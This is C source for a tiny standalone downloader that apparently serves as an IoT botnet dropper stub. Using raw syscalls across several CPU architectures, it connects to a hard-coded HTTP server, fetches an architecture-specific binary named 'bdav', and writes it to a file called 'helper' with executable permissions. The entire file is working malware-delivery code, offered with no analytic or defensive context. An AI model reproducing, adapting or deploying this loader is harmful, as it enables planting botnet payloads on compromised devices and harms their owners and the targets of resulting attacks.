#include <sys/types.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>

#if BYTE_ORDER == BIG_ENDIAN
#define HTONS(n) (n)
#define HTONL(n) (n)
#elif BYTE_ORDER == LITTLE_ENDIAN
#define HTONS(n) (((((unsigned short)(n) & 0xff)) << 8) | (((unsigned short)(n) & 0xff00) >> 8))
#define HTONL(n) (((((unsigned long)(n) & 0xff)) << 24) | \
                  ((((unsigned long)(n) & 0xff00)) << 8) | \
                  ((((unsigned long)(n) & 0xff0000)) >> 8) | \
                  ((((unsigned long)(n) & 0xff000000)) >> 24))
#else
#error "Fix byteorder"
#endif

#ifdef __ARM_EABI__
#define SCN(n) ((n) & 0xfffff)
#else
#define SCN(n) (n)
#endif

#define HTTP_SERVER utils_inet_addr(127,0,0,1)
#define HTTP_PORT HTONS(80)

inline int run(void);
int sstrlen(char *);
unsigned int utils_inet_addr(unsigned char, unsigned char, unsigned char, unsigned char);

int xsocket(int, int, int);
int xwrite(int, void *, int);
int xread(int, void *, int);
int xconnect(int, struct sockaddr_in *, int);
int xopen(char *, int, int);
int xclose(int);
void x__exit(int);

#define socket xsocket
#define write xwrite
#define read xread
#define connect xconnect
#define open xopen
#define close xclose
#define __exit x__exit
/*void __start(){
 __exit(run());
}*/

void __start(){ 
#if defined(MIPS) || defined(MIPSEL)
  __asm(
    ".set noreorder\n"
    "move $0, $31\n"
    "bal 10f\n"
    "nop\n"
    "10:\n.cpload $31\n"
    "move $31, $0\n"
    ".set reorder\n"
  );
#endif
  __exit(run());
}

inline int run(void){
  char recvbuf[128];
  struct sockaddr_in addr;
  int sfd, ffd, ret;
  unsigned int header_parser = 0;
  int arch_strlen = sstrlen(ARCH);

  addr.sin_family = AF_INET;
  addr.sin_port = HTTP_PORT;
  addr.sin_addr.s_addr = HTTP_SERVER;

  ffd = open("helper", O_WRONLY | O_CREAT | O_TRUNC, 0777);

  sfd = socket(AF_INET, SOCK_STREAM, 0);

  write(2, "START\n", 6);

  if (sfd == -1 || ffd == -1){
    write(2, "FDFAIL\n", 7);
    return 1;
  }

  if ((ret = connect(sfd, &addr, sizeof (struct sockaddr_in))) < 0){
    write(2, "HFAIL\n", 6);
    return -ret;
  }
  if (write(sfd, "GET /bin/bdav." ARCH " HTTP/1.0\r\n\r\n", 14 + arch_strlen + 13) != (14 + arch_strlen + 13)){
    write(2, "RFAIL\n", 6);
    return 3;
  }

  while (header_parser != 0x0d0a0d0a){
    char ch;
    int ret = read(sfd, &ch, 1);
    if (ret != 1)
      return 4;
    header_parser = (header_parser << 8) | ch;
  }

  while (1){
    int ret = read(sfd, recvbuf, sizeof (recvbuf));
    if (ret <= 0)
      break;
    write(ffd, recvbuf, ret);
  }
  close(sfd);
  close(ffd);
  return 5;
}

int sstrlen(char *str){
  int c = 0;
  while (*str++ != 0)
    c++;
  return c;
}

unsigned int utils_inet_addr(unsigned char one, unsigned char two, unsigned char three, unsigned char four){
  unsigned long ip = 0;
  ip |= (one << 24);
  ip |= (two << 16);
  ip |= (three << 8);
  ip |= (four << 0);
  return HTONL(ip);
}

int xsocket(int domain, int type, int protocol){
#if defined(__NR_socketcall)
#ifdef DEBUG
  printf("socket using socketcall\n");
#endif
  struct {
    int domain, type, protocol;
  } socketcall;
  socketcall.domain = domain;
  socketcall.type = type;
  socketcall.protocol = protocol;

  // 1 == SYS_SOCKET
  int ret = syscall(SCN(SYS_socketcall), 1, &socketcall);

#ifdef DEBUG
  printf("socket got ret: %d\n", ret);
#endif
  return ret;
#else
#ifdef DEBUG
  printf("socket using socket\n");
#endif
  return syscall(SCN(SYS_socket), domain, type, protocol);
#endif
}

int xread(int fd, void *buf, int len){
  return syscall(SCN(SYS_read), fd, buf, len);
}

int xwrite(int fd, void *buf, int len){
  return syscall(SCN(SYS_write), fd, buf, len);
}

int xconnect(int fd, struct sockaddr_in *addr, int len){
#if defined(__NR_socketcall)
#ifdef DEBUG
  printf("connect using socketcall\n");
#endif
  struct {
    int fd;
    struct sockaddr_in *addr;
    int len;
  } socketcall;
  socketcall.fd = fd;
  socketcall.addr = addr;
  socketcall.len = len;
  // 3 == SYS_CONNECT
  int ret = syscall(SCN(SYS_socketcall), 3, &socketcall);

#ifdef DEBUG
  printf("connect got ret: %d\n", ret);
#endif

  return ret;
#else
#ifdef DEBUG
  printf("connect using connect\n");
#endif
  return syscall(SCN(SYS_connect), fd, addr, len);
#endif
}

int xopen(char *path, int flags, int other){
  return syscall(SCN(SYS_open), path, flags, other);
}

int xclose(int fd){
  return syscall(SCN(SYS_close), fd);
}

void x__exit(int code){
  syscall(SCN(SYS_exit), code);
}
